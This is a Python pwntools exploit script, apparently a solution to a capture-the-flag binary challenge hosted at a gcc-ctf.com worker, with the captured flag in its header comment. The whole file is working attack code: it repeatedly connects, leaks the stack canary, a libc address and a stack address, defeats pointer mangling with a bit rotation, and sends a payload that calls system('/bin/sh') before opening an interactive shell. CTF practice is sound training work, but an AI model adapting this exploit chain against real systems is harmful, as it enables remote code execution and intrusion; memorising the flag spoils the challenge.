from pwn import *


'''
remote exploit, sadly need a bit of brute-force since offset were
different from local.

GCC{Cl4nG_iN_GCC_c7F_i5_k1nD4_fUnNy}

'''
def write_me(res,datas):
    r.sendlineafter(b'>',b'1')
    r.sendlineafter(b'>',datas)

def leak_me2(res,datas):
    r.sendlineafter(b'>',b'1')
    r.sendlineafter(b'>',datas)

    leaked = r.recvuntil(b'I say : lmao')
    return leaked

def leak_me(res,datas):
    r.sendlineafter(b'>',b'1')
    r.sendlineafter(b'>',datas)

    leaked = r.recvuntil(b'I say : lmao')
    leaked_data= leaked.split(datas+b'\n')[1].split(b"\nI say")[0]
    return leaked_data

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))


for i in range(600):
    r= remote("worker01.gcc-ctf.com",10457)
    libc= ELF("./libc.so.6")

    try:
        goto_canary = b'A'*72
        fake_canary_leak = leak_me(r,goto_canary)
        expected_fake_canary = b'\x00' +fake_canary_leak
        canary_formated = u64(expected_fake_canary)
        print("fake canary: ", hex(canary_formated))



    # # now leak libc
        goto_libc = b'B'*1767
        libc_leak = leak_me(r,goto_libc)
        libc_leaked = u64(libc_leak+b'\x00'*2)
        
        print("libc leaked: ", hex(libc_leaked))



    # now stack leak :
        goto_stack = b'C'*1903
        stack_leak = leak_me(r,goto_stack)
        stack_leaked = u64(stack_leak+b'\x00'*2)
        print("stack leaked: ", hex(stack_leaked))


    # calculate libc base address
        libc_system = (libc_leaked-0x187c60)
        libc_base = libc_system - libc.symbols["system"]
        libc_binsh = libc_base + next(libc.search(b'/bin/sh\x00'))


        libc_system = libc_base+libc.symbols["system"]

        system_xor = rol(libc_system, 0x11,64)

        final_payload=p64(system_xor)
        final_payload+=p64(libc_binsh)
        final_payload+=p64(0)*2
        final_payload+=b'A'*(40)
        final_payload+=p64(canary_formated) 
        final_payload+=b'C'*1744
        final_payload+=p64(stack_leaked)
        final_payload+=p64(0)*9
        final_payload+=p64(stack_leaked)
        final_payload+=p64(stack_leaked+0x7fffb0)
        final_payload+=p64(0x800000)
        final_payload+=p64(0x1000)
        final_payload+=p64(stack_leaked+0x790)
        final_payload+=p64(stack_leaked+0x1130)
        final_payload+=p64(stack_leaked+0x790)
        final_payload+=p64(0)*4


        write_me(r,final_payload)
        
        r.sendline(b'2')
        r.interactive()
        sleep(0.2)
    except:
        r.close()
        pass
    sleep(0.2)




